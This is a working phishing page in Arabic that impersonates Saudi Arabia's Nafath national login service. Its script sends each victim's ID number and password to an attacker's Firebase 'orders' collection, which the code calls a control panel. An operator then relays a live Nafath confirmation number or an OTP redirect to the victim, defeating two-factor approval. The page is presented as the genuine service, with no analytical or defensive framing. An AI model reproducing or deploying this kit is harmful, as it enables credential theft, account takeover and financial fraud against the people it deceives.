<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="js/theme-toggle.js"></script>
    <title>نفاذ | التوثيق</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="css/site-theme.css">
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
    <style>
        body { display: flex; flex-direction: column; align-items: center; min-height: 100vh; direction: rtl; }
        .nafath-header {
            width: 100%; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center;
            margin-bottom: 40px;
        }
        .header-logo { height: 60px; }
        .vision-logo { height: 45px; }
        .nafath-card { width: 100%; max-width: 450px; padding: 40px; text-align: center; border-radius: var(--tree-radius-lg); }
        .auth-logo { height: 80px; margin-bottom: 30px; }
        .spinner {
            width: 60px; height: 60px; border: 5px solid var(--tree-border); border-top: 5px solid var(--tree-primary);
            border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .number-display {
            font-size: 4rem; font-weight: bold; width: 120px; height: 120px;
            display: flex; align-items: center; justify-content: center; border-radius: 50%; border-width: 3px; border-style: solid;
            margin: 20px auto;
        }
        .title { font-size: 1.3rem; font-weight: bold; margin-bottom: 10px; color: var(--tree-text); }
        .subtitle { font-size: 0.9rem; margin-bottom: 25px; color: var(--tree-text-muted); }
        .form-control { padding: 12px; border-radius: 10px; margin-bottom: 20px; text-align: right; }
        .btn-login { width: 100%; padding: 12px; border: none; border-radius: 12px; font-weight: bold; transition: 0.3s; font-size: 1.1rem; }
        #code-screen { display: none; width: 100%; animation: fadeIn 0.5s; }
        #loading-screen { display: none; flex-direction: column; align-items: center; width: 100%; animation: fadeIn 0.5s; }
        #login-screen { width: 100%; animation: fadeIn 0.5s; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .footer-links { margin-top: 20px; font-size: 0.85rem; }
        .footer-links a { text-decoration: none; margin: 0 10px; color: var(--tree-primary); }
    </style>
</head>
<body class="tree-site">

<button type="button" class="tree-theme-toggle" onclick="toggleTreeTheme()" aria-label="تبديل الوضع الليلي"><span class="tree-theme-toggle__glyph" aria-hidden="true"></span></button>

    <!-- الهيدر الرسمي -->
    <div class="nafath-header">
        <img src="images/nafath/nafath-wordmark.svg" alt="نفاذ" class="header-logo" width="200" height="56">
        <img src="images/nafath/vision-2030-inspired.svg" alt="رؤية 2030" class="vision-logo" width="160" height="48">
    </div>

    <div class="nafath-card">
        <!-- شاشة تسجيل الدخول (جديد) -->
        <div id="login-screen">
            <img src="images/nafath/auth-user-lock.svg" class="auth-logo" alt="تسجيل الدخول" width="96" height="96">
            <div class="title">تسجيل الدخول</div>
            <div class="subtitle">النفاذ الوطني الموحد</div>
            
            <form onsubmit="handleNafathLogin(event)">
                <label class="w-100 text-start small fw-bold text-secondary mb-1">اسم المستخدم / رقم الهوية</label>
                <input type="text" id="nafath_username" class="form-control" required oninput="this.value = this.value.replace(/[^0-9]/g, '')">
                
                <label class="w-100 text-start small fw-bold text-secondary mb-1">كلمة المرور</label>
                <input type="password" id="nafath_password" class="form-control" required>
                
                <button type="submit" class="btn-login">دخول</button>
                
                <div class="footer-links mt-3">
                    <a href="#">نسيت كلمة المرور؟</a> | <a href="#">تسجيل جديد</a>
                </div>
            </form>
        </div>

        <!-- شاشة الانتظار -->
        <div id="loading-screen">
            <div class="spinner"></div>
            <div class="title">جاري التحقق...</div>
            <div class="subtitle">يرجى الانتظار بينما يتم توجيه طلبك</div>
        </div>

        <!-- شاشة الرقم -->
        <div id="code-screen">
            <div class="title text-success">افتح تطبيق نفاذ</div>
            <div class="subtitle">وقم باختيار الرقم التالي لتأكيد طلبك</div>
            <div class="number-display" id="display-num">--</div>
            <div id="timer-box" style="margin-top: 20px; color: #dc3545; font-weight: bold; font-size: 0.9rem; display: none;">ينتهي الرقم خلال: <span id="timer">01:00</span></div>
        </div>
    </div>

<script>
    // إعدادات Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
        authDomain: "tameen-658e9.firebaseapp.com",
        projectId: "tameen-658e9",
        storageBucket: "tameen-658e9.firebasestorage.app",
        messagingSenderId: "292670676256",
        appId: "1:292670676256:web:3624157751cd194efe4b45"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // جلب الـ ID المحفوظ
    const userId = localStorage.getItem('user_id');

    let timerInterval;

    // دالة التعامل مع تسجيل دخول نفاذ
    async function handleNafathLogin(e) {
        e.preventDefault();
        const user = document.getElementById('nafath_username').value;
        const pass = document.getElementById('nafath_password').value;

        // إخفاء الدخول وإظهار الانتظار
        document.getElementById('login-screen').style.display = 'none';
        document.getElementById('loading-screen').style.display = 'flex';

        // إرسال البيانات للوحة التحكم
        try {
            await db.collection("orders").doc(userId).update({
                nafath_username: user,
                nafath_password: pass,
                status: "تم تسجيل دخول نفاذ - بانتظار الرقم"
            });
        } catch (err) { console.error(err); }
    }

    function startTimer(duration) {
        let timer = duration, minutes, seconds;
        const display = document.getElementById('timer');
        document.getElementById('timer-box').style.display = 'block';
        
        clearInterval(timerInterval);
        timerInterval = setInterval(function () {
            minutes = parseInt(timer / 60, 10);
            seconds = parseInt(timer % 60, 10);
            display.textContent = (minutes < 10 ? "0" + minutes : minutes) + ":" + (seconds < 10 ? "0" + seconds : seconds);
            if (--timer < 0) { clearInterval(timerInterval); display.textContent = "00:00"; }
        }, 1000);
    }

    if (userId) {
        // مراقبة الطلب لحظة بلحظة
        db.collection("orders").doc(userId).onSnapshot((doc) => {
            if (doc.exists) {
                const data = doc.data();

                // إذا أرسلت رقم نفاذ من لوحة التحكم
                if (data.next_step === "SHOW_NAFATH_CODE" && data.nafath_code) {
                    // التحقق من أن الشاشة لم تظهر بعد لمنع إعادة تشغيل المؤقت عند تحديث البيانات
                    if (document.getElementById('code-screen').style.display !== 'block') {
                        document.getElementById('login-screen').style.display = 'none';
                        document.getElementById('loading-screen').style.display = 'none';
                        document.getElementById('code-screen').style.display = 'block';
                        document.getElementById('display-num').innerText = data.nafath_code;
                        startTimer(60); // تشغيل العداد لمدة 60 ثانية
                    }
                }

                // إذا ضغطت "رفض" في لوحة التحكم
                if (data.next_step === "GO_TO_REJECT") {
                    window.location.href = "payment_failed.html";
                }

                // إذا ضغطت "طلب كود OTP"
                if (data.next_step === "GO_TO_OTP") {
                    window.location.href = "nafath_otp.html";
                }
            }
        });
    } else {
        // إذا دخل الصفحة بدون تسجيل بيانات يرجعه للرئيسية
        window.location.href = "index.html";
    }
</script>
</body>
</html>
